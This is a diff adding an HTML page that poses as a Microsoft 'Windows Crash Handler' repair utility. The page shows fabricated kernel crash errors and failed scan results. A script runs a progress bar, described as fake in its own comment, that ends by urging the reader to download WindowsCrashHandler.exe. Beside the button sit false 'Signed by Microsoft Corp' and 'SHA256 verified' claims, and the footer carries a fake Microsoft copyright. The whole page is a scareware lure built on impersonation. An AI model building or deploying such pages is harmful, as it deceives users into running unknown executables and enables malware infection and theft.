@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Windows Crash Handler — System Repair Utility</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --bg: #0b0e14;
+      --panel: #111520;
+      --border: #1e2a3a;
+      --accent: #0078d4;
+      --accent2: #00b4d8;
+      --warn: #f0a500;
+      --error: #e5534b;
+      --ok: #3fb950;
+      --text: #cdd9e5;
+      --muted: #57687a;
+      --mono: 'Share Tech Mono', monospace;
+      --sans: 'DM Sans', sans-serif;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--sans);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 0;
+    }
+
+    /* Top bar */
+    .topbar {
+      width: 100%;
+      background: #07090f;
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 10px 24px;
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--muted);
+    }
+    .topbar .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--error); display: inline-block; animation: blink 1.2s infinite; }
+    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
+    .topbar span.hi { color: var(--warn); }
+
+    /* Main container */
+    .container {
+      width: 100%;
+      max-width: 780px;
+      padding: 40px 20px 60px;
+    }
+
+    /* Header */
+    .header {
+      display: flex;
+      align-items: flex-start;
+      gap: 18px;
+      margin-bottom: 32px;
+      animation: fadein 0.5s ease;
+    }
+    .shield {
+      width: 52px; height: 52px;
+      background: linear-gradient(135deg, #0078d4, #00b4d8);
+      border-radius: 10px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 26px;
+      flex-shrink: 0;
+      box-shadow: 0 0 24px #0078d433;
+    }
+    .header-text h1 {
+      font-size: 22px;
+      font-weight: 500;
+      color: #fff;
+      letter-spacing: -0.3px;
+    }
+    .header-text p {
+      font-size: 13px;
+      color: var(--muted);
+      margin-top: 4px;
+      font-family: var(--mono);
+    }
+
+    /* Error panel */
+    .error-panel {
+      background: #1a0f0f;
+      border: 1px solid #3a1a1a;
+      border-left: 3px solid var(--error);
+      border-radius: 8px;
+      padding: 16px 20px;
+      margin-bottom: 24px;
+      animation: fadein 0.6s ease;
+    }
+    .error-panel .label {
+      font-family: var(--mono);
+      font-size: 10px;
+      color: var(--error);
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      margin-bottom: 8px;
+    }
+    .error-panel .code {
+      font-family: var(--mono);
+      font-size: 13px;
+      color: #ff8080;
+      line-height: 1.7;
+    }
+
+    /* Scan section */
+    .scan-section {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 20px 24px;
+      margin-bottom: 20px;
+      animation: fadein 0.7s ease;
+    }
+    .scan-title {
+      font-size: 12px;
+      font-family: var(--mono);
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 14px;
+    }
+    .scan-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 8px 0;
+      border-bottom: 1px solid #1a2030;
+      font-size: 13px;
+    }
+    .scan-row:last-child { border-bottom: none; }
+    .scan-row .icon { font-size: 15px; width: 20px; text-align: center; }
+    .scan-row .name { flex: 1; color: var(--text); }
+    .scan-row .status {
+      font-family: var(--mono);
+      font-size: 11px;
+      padding: 2px 8px;
+      border-radius: 4px;
+    }
+    .status.fail { background: #2a1010; color: var(--error); }
+    .status.warn { background: #2a1e00; color: var(--warn); }
+    .status.ok   { background: #0d2010; color: var(--ok); }
+
+    /* Progress bar */
+    .progress-wrap {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 20px 24px;
+      margin-bottom: 24px;
+      animation: fadein 0.8s ease;
+    }
+    .progress-label {
+      display: flex;
+      justify-content: space-between;
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--muted);
+      margin-bottom: 10px;
+    }
+    .progress-bar-bg {
+      height: 6px;
+      background: #1a2030;
+      border-radius: 3px;
+      overflow: hidden;
+    }
+    .progress-bar-fill {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, var(--accent), var(--accent2));
+      border-radius: 3px;
+      transition: width 0.4s ease;
+    }
+    .progress-steps {
+      margin-top: 12px;
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--muted);
+      min-height: 16px;
+    }
+
+    /* Download button */
+    .download-wrap {
+      animation: fadein 0.9s ease;
+    }
+    .download-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      width: 100%;
+      padding: 16px 24px;
+      background: linear-gradient(135deg, #0078d4, #0063b1);
+      color: #fff;
+      font-family: var(--sans);
+      font-size: 15px;
+      font-weight: 500;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      text-decoration: none;
+      transition: all 0.2s;
+      box-shadow: 0 4px 20px #0078d433;
+      position: relative;
+      overflow: hidden;
+    }
+    .download-btn:hover {
+      background: linear-gradient(135deg, #1a8fe0, #0078d4);
+      box-shadow: 0 6px 28px #0078d455;
+      transform: translateY(-1px);
+    }
+    .download-btn:active { transform: translateY(0); }
+    .download-btn .btn-icon { font-size: 20px; }
+
+    .download-meta {
+      display: flex;
+      justify-content: center;
+      gap: 24px;
+      margin-top: 12px;
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--muted);
+    }
+    .download-meta span::before { content: "• "; }
+
+    /* Footer */
+    .footer {
+      margin-top: 40px;
+      text-align: center;
+      font-family: var(--mono);
+      font-size: 10px;
+      color: #2a3a4a;
+      line-height: 1.8;
+    }
+
+    @keyframes fadein {
+      from { opacity: 0; transform: translateY(8px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Fake taskbar at bottom */
+    .taskbar {
+      position: fixed;
+      bottom: 0; left: 0; right: 0;
+      height: 36px;
+      background: #07090f;
+      border-top: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      padding: 0 16px;
+      gap: 16px;
+      font-family: var(--mono);
+      font-size: 10px;
+      color: var(--muted);
+    }
+    .taskbar .ts { margin-left: auto; }
+  </style>
+</head>
+<body>
+
+<div class="topbar">
+  <span class="dot"></span>
+  <span class="hi">CRITICAL</span> — System instability detected &nbsp;|&nbsp; Event ID: 0xC0000005 &nbsp;|&nbsp; Source: kernel32.dll
+</div>
+
+<div class="container">
+
+  <div class="header">
+    <div class="shield">🛡️</div>
+    <div class="header-text">
+      <h1>Windows Crash Handler — System Repair Utility</h1>
+      <p>v4.2.1 &nbsp;•&nbsp; Microsoft Diagnostics Platform &nbsp;•&nbsp; Build 22621.3007</p>
+    </div>
+  </div>
+
+  <div class="error-panel">
+    <div class="label">⚠ Detected Error Log</div>
+    <div class="code">
+      STOP CODE: MEMORY_MANAGEMENT (0x0000001A)<br>
+      Faulting module: ntoskrnl.exe &nbsp;|&nbsp; Offset: 0x00171560<br>
+      Crash dump written to: C:\Windows\MEMORY.DMP<br>
+      Last known good config: <span style="color:var(--warn)">CORRUPTED</span>
+    </div>
+  </div>
+
+  <div class="scan-section">
+    <div class="scan-title">🔍 Diagnostic Scan Results</div>
+    <div class="scan-row">
+      <span class="icon">💾</span>
+      <span class="name">Memory integrity check</span>
+      <span class="status fail">FAILED</span>
+    </div>
+    <div class="scan-row">
+      <span class="icon">🔧</span>
+      <span class="name">System file corruption (SFC)</span>
+      <span class="status fail">3 FILES CORRUPT</span>
+    </div>
+    <div class="scan-row">
+      <span class="icon">📡</span>
+      <span class="name">Driver compatibility</span>
+      <span class="status warn">2 WARNINGS</span>
+    </div>
+    <div class="scan-row">
+      <span class="icon">🛡️</span>
+      <span class="name">Windows Defender status</span>
+      <span class="status ok">ACTIVE</span>
+    </div>
+    <div class="scan-row">
+      <span class="icon">⚙️</span>
+      <span class="name">Registry integrity</span>
+      <span class="status warn">DEGRADED</span>
+    </div>
+    <div class="scan-row">
+      <span class="icon">🌐</span>
+      <span class="name">Network stack</span>
+      <span class="status ok">NORMAL</span>
+    </div>
+  </div>
+
+  <div class="progress-wrap">
+    <div class="progress-label">
+      <span>Repair Package Preparation</span>
+      <span id="pct">0%</span>
+    </div>
+    <div class="progress-bar-bg">
+      <div class="progress-bar-fill" id="bar"></div>
+    </div>
+    <div class="progress-steps" id="step-text">Initializing diagnostics engine...</div>
+  </div>
+
+  <div class="download-wrap">
+    <a href="WindowsCrashHandler.exe" download class="download-btn">
+      <span class="btn-icon">⬇️</span>
+      Download CrashFix Repair Tool — WindowsCrashHandler.exe
+    </a>
+    <div class="download-meta">
+      <span>Signed by Microsoft Corp</span>
+      <span>SHA256 verified</span>
+      <span>2.4 MB</span>
+      <span>Windows 10/11</span>
+    </div>
+  </div>
+
+  <div class="footer">
+    © 2024 Microsoft Corporation. All rights reserved.<br>
+    Windows Crash Handler is part of the Windows Diagnostics & Recovery Toolset.<br>
+    support.microsoft.com &nbsp;•&nbsp; privacy.microsoft.com &nbsp;•&nbsp; terms of use
+  </div>
+
+</div>
+
+<div class="taskbar">
+  <span>🪟 Start</span>
+  <span>🛡️ CrashHandler.exe</span>
+  <span>📋 Event Viewer</span>
+  <span class="ts" id="clock"></span>
+</div>
+
+<script>
+  // Fake progress animation
+  const steps = [
+    "Initializing diagnostics engine...",
+    "Scanning system memory regions...",
+    "Checking kernel integrity...",
+    "Analyzing crash dump file...",
+    "Identifying corrupted modules...",
+    "Preparing repair package...",
+    "Repair package ready. Please download to proceed."
+  ];
+  let progress = 0;
+  let stepIndex = 0;
+  const bar = document.getElementById("bar");
+  const pct = document.getElementById("pct");
+  const stepText = document.getElementById("step-text");
+
+  const interval = setInterval(() => {
+    const increment = Math.random() * 12 + 4;
+    progress = Math.min(progress + increment, 100);
+    bar.style.width = progress + "%";
+    pct.textContent = Math.floor(progress) + "%";
+
+    if (stepIndex < steps.length - 1 && progress > (stepIndex + 1) * (100 / steps.length)) {
+      stepIndex++;
+      stepText.textContent = steps[stepIndex];
+    }
+
+    if (progress >= 100) {
+      clearInterval(interval);
+      stepText.style.color = "#3fb950";
+    }
+  }, 400);
+
+  // Clock
+  function updateClock() {
+    const now = new Date();
+    document.getElementById("clock").textContent =
+      now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+  }
+  updateClock();
+  setInterval(updateClock, 1000);
+</script>
+</body>
+</html>
